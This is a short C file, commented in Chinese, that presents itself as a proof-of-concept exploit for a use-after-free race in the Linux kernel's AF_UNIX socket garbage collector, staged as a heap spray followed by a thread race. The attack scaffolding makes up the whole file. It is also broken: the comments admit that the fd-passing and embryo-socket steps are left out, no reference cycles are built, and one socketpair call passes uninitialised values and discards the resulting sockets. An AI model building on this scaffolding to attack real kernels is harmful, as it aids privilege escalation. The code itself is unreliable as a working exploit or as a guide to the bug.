// af_unix_gc_race.c
// 编译: gcc -o gc_race af_unix_gc_race.c
// 需要 root 或 CAP_NET_ADMIN 来调整 /proc/sys/net/unix 相关参数
#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>

#define N_SOCKS 64

// 阶段 1：创建环状引用，填充 GC 的 scc_index 堆喷
void spray_cyclic(int *fds, int n) {
    for (int i = 0; i < n; i++) {
        int sv[2];
        socketpair(AF_UNIX, SOCK_DGRAM, 0, sv);
        // 将 sv[0] 的引用通过 SCM_RIGHTS 传递给下一个 socket
        // 这里简化：仅创建环，实际需要 sendmsg 传递 fd
        fds[i] = sv[0];
        close(sv[1]);
    }
    // 关闭所有，触发 GC
    for (int i = 0; i < n; i++) close(fds[i]);
}

// 阶段 2：创建 in-flight socket，然后触发 GC 的 fast path
void *gc_trigger(void *arg) {
    int *fds = (int *)arg;
    // 触发 GC 的简单方式：创建并关闭一个环
    int sv[2];
    socketpair(AF_UNIX, SOCK_DGRAM, 0, sv);
    close(sv[0]);
    close(sv[1]);
    return NULL;
}

int main() {
    int fds[N_SOCKS];
    
    printf("[*] Stage 1: heap spray scc_index\n");
    spray_cyclic(fds, N_SOCKS);
    
    printf("[*] Stage 2: create in-flight sockets\n");
    int a, b, c;
    socketpair(AF_UNIX, SOCK_DGRAM, 0, (int[]){a, b});
    // 实际需要 embryo socket 逻辑，这里仅示意
    
    printf("[*] Stage 3: race GC fast path with new edge\n");
    pthread_t t;
    for (int i = 0; i < 1000; i++) {
        pthread_create(&t, NULL, gc_trigger, fds);
        // 同时尝试添加新 edge（需要真实 unix_add_edge 路径）
        pthread_join(t, NULL);
    }
    
    printf("[*] Done. Check dmesg for GC warnings or UAF.\n");
    return 0;
}
